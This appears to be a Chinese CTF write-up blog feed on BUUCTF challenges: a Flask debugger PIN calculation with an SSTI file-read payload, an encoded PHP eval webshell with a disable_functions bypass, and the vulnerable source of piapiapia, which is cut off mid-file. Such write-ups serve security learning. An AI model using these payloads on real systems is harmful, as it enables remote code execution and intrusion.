<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">16:e9:44:6b:ba:87</span><br></pre></td></tr></table></figure>

<p><strong>将2aa820fa5c86转换为10进制为：46901596150918</strong></p>
<p>(6)docker机器id<br>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件。<br>对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc/self/cgroup&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1:name=systemd:/docker/310e09efcc43ceb10e426a0ffc99add5c651575fe93627e6019400d4520272ed 0::/system.slice/containerd.service</span><br></pre></td></tr></table></figure>

<p>但buu 环境出了问题，机器码有问题算不出来</p>
<p>然后带入大佬写的shengchengpin码的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;flaskweb&#x27;# username</span><br><span class="line">    &#x27;flask.app&#x27;,# modname</span><br><span class="line">    &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">    &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485410388611&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address</span><br><span class="line">    &#x27;310e09efcc43ceb10e426a0ffc99add5c651575fe93627e6019400d4520272ed&#x27;# get_machine_id(), /etc/machine-id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu3</title>
    <url>/2023/06/03/buu%E5%90%88%E9%9B%86-buu3/</url>
    <content><![CDATA[<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line"></span><br><span class="line">$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));</span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line"></span><br><span class="line">$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));</span><br><span class="line"></span><br><span class="line">echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br></pre></td></tr></table></figure>

<p>修改为post传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assert（eval($_POST[1])）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p>，上蚁剑disable_function,插件</p>
<p><img src="/2023/06/03/buu%E5%90%88%E9%9B%86-buu3/QQ%E6%88%AA%E5%9B%BE20230603194104.png"></p>
<p>运行这个，</p>
<p>在终端运行&#x2F;readflag即可</p>
<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p><a href="http://www.zip/">www.zip</a> 下载源码,显示config.php中存在flag</p>
<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="register-php"><a href="#register-php" class="headerlink" title="register.php"></a>register.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">is_exists</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">			<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">register</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$key_list</span> = <span class="title function_ invoke__">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		<span class="variable">$value_list</span> = <span class="title function_ invoke__">Array</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">insert</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;link = <span class="title function_ invoke__">mysql_connect</span>(</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		<span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>, <span class="variable">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure>



<h3 id="updata-php"><a href="#updata-php" class="headerlink" title="updata.php"></a>updata.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">update_profile</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="profile-php"><a href="#profile-php" class="headerlink" title="profile.php"></a>profile.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">//&lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span></span><br><span class="line"><span 